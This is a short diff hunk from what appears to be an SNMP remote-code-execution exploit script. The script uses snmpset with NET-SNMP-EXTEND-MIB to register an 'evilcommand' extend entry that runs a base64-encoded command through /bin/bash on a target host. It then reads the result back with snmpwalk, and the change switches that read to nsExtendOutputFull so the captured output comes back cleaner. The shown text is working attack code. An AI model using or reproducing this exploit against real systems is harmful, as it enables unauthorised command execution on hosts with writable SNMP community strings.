@@ -44,7 +44,7 @@ def run(ip, communitystring, version, snmpset, snmpwalk):
 		cmd = base64.b64encode(cmd.encode()).decode()
 		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"' = destroy > /dev/null""".format(snmpset, version, com_str, ip))
 		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"'  = createAndGo 'nsExtendCommand."evilcommand"' = /bin/bash 'nsExtendArgs."evilcommand"' = "-c \\\"echo {} | base64 -d | sh\\\"" > /dev/null""".format(snmpset, version, com_str, ip, cmd))
-		output = os.system("""{} -v {} -c {} {} NET-SNMP-EXTEND-MIB::nsExtendObjects > /tmp/snmprce""".format(snmpwalk, version, com_str, ip))
+		output = os.system("""{} -v {} -c {} {} NET-SNMP-EXTEND-MIB::nsExtendOutputFull > /tmp/snmprce""".format(snmpwalk, version, com_str, ip))
 
 		with open('/tmp/snmprce', 'r') as file:
 			final = ""
